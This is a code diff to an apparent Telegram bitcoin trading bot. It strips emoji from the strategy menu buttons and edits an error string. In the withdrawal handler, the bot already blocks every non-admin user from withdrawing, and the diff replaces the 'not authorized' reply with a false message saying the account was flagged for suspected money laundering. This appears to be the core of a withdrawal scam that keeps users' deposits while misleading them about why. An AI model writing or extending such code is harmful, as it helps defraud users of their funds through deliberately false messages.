@@ -96,9 +96,9 @@ def get_main_menu():
 def get_strategy_menu():
     keyboard = [
         [
-            InlineKeyboardButton(safe_text("📈 Momentum"), callback_data='strategy_momentum'),
-            InlineKeyboardButton(safe_text("📉 Mean Reversion"), callback_data='strategy_mean'),
-            InlineKeyboardButton(safe_text("⚙️ Grid Trading"), callback_data='strategy_grid'),
+            InlineKeyboardButton(safe_text("Momentum"), callback_data='strategy_momentum'),
+            InlineKeyboardButton(safe_text("Mean Reversion"), callback_data='strategy_mean'),
+            InlineKeyboardButton(safe_text("Grid Trading"), callback_data='strategy_grid'),
         ],
         [InlineKeyboardButton(safe_text("🔙 Back"), callback_data='back_to_main')]
     ]
@@ -153,7 +153,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif action == "withdrawal":
         if user_id not in admins:
-            await query.edit_message_text("❌ Transaction failed: You are not authorized to withdraw.", reply_markup=get_main_menu())
+            await query.edit_message_text("❌ Transaction failed: Your account was flagged for Suspicion of Money Laundering. Please, allow our team to resolve this before trying to withdrawal your balance again.", reply_markup=get_main_menu())
             return
         if balance <= 0:
             await query.edit_message_text("❌ You can’t withdraw with a 0.00000000 BTC balance.", reply_markup=get_main_menu())
@@ -182,7 +182,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             btc_price = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd").json()["bitcoin"]["usd"]
         except:
-            btc_price = "Unknown"
+            btc_price = "Error: 404"
 
         is_running = "✅ Running" if state["running"] else "⛔️ Not Running"
         strategy = state["strategy"] if state["strategy"] else "None Selected"
@@ -411,3 +411,4 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
